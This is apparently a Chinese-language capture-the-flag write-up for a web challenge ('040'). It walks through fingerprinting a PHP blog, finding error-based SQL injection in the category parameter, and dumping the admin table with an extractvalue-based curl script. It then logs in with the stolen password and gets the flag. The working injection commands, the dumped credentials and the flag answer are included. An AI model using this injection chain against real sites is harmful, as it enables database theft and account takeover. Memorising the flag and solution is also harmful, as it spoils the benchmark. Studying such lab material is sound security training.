## 题解

### 入口与指纹

`Apache/2.4.54` + `X-Powered-By: PHP/7.4.33`，标题 `Blog Home`。
界面与 `xben-039-24` 同源（同样的 Notice、同样的 `styles.css`、同样的
`/admin.php` + `/flag.php`），但**行为不同**：

| 行为 | 039 | 040（本题） |
| --- | --- | --- |
| `?category=` 筛选 | 完全失效（恒返回 10 篇） | **生效**（Nature→3、Secret→0、空→10） |
| `admin'-- -` 登录 | 直接过 | `Invalid`（登录已加固） |

所以 039 的经验在这里**必须重测**，不能照搬。

### 关键观察

**1. `category` 拼进 SQL，且报错回显。**

```bash
curl --get --data-urlencode "category=Nature'" http://$T/
# error in your SQL syntax; … near ''Nature''' at line 1
```

错误信息出现在页面上 → **错误注入可直接用**。

**2. 但注释符之后「查询成功、结果为空」，说明还有一层 PHP 过滤。**

| payload | 行数 | 报错 |
| --- | --- | --- |
| `Nature` | 3 | — |
| `Nature'` | 0 | 有（near `''Nature'''`） |
| `Nature'-- -` | 0 | **无** |
| `Nature'#` | 0 | 无 |
| `' OR 1=1-- -` | 0 | 无 |

判据：注释生效后 SQL 合法（无报错），但页面仍是 `No posts found`。
说明 SQL 之后还有一次 PHP 侧的比较（用原始 `$category` 字符串），
UNION 出来的行也会被判为「不属于该分类」。

**这就把方向从「UNION 取数」推到「错误注入取数」**——后者不依赖结果集。

**3. `extractvalue` / `updatexml` 可用（MySQL 5.7.44）。**

```bash
category=Nature' AND extractvalue(1,concat(0x7e,database()))#
# XPATH syntax error: '~blogDB'
```

`extractvalue` 的错误串上限约 32 字节，所以取值要分段或用 `LIMIT` 逐行取。

### 利用链

```bash
T=$(head -1 .target)
x() {  # 错误注入取值
  curl -sS --get \
    --data-urlencode "category=Nature' AND extractvalue(1,concat(0x7e,($1)))#" \
    "http://$T/" \
  | grep -ao "XPATH syntax error: '[^']*'" | head -1 \
  | sed "s/XPATH syntax error: '~//;s/'\$//"
}

x "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()"
# admins,comments,posts

x "SELECT GROUP_CONCAT(CONCAT(id,0x7c,username,0x7c,password)) FROM admins"
# 1|admin|384frw9&*EYH333
```

拿到管理员口令后正常登录 `/admin.php`：

```bash
curl -sS -X POST \
  --data-urlencode 'username=admin' \
  --data-urlencode 'password=384frw9&*EYH333' \
  "http://$T/admin.php" | grep -o 'flag{[^}]*}'
```

```text
flag{4d093ee7-c92d-4dfa-ba55-ed47bb9eab00}
```

### flag 位置

`/admin.php` 登录成功后的响应正文。数据库里**没有** flag 表/article，
`Secret` 分类也是空选（0 篇）——flag 只在管理员登录分支输出。

## 复盘

- **同源不同题，先重测再动手。** 039 的 `admin'-- -` 一次就过，040 却返回 `Invalid`；
  039 的分类筛选是坏的，040 是好的。**界面相同不代表行为相同。**
- **「注释后无报错但结果为空」= SQL 之后还有 PHP 过滤。** 这是本题最重要的判断：
  它把 UNION 这条路直接掐死（注入出来的行 category 不等于原始字符串），
  但也说明**错误注入**不受影响，因为错误信息在过滤之前就产生并输出了。
- **`extractvalue`/`updatexml` 是 MySQL 错误注入的首选。** 一次请求就能带回一段字符串；
  限制是约 32 字节，所以用 `LIMIT i,1` 逐行取、或用 `GROUP_CONCAT` 拼短字段。
- **拿到口令后走正常登录**，比继续用 SQL 硬凑输出更省事——
  管理员页面本来就把 flag 打出来。
- **Notice 与 SQL 报错是两层不同的信息泄露**：Notice 给路径（`/var/www/html/index.php:28`），
  报错给 SQL 片段（`near ''Nature'''`）。两者都要读。
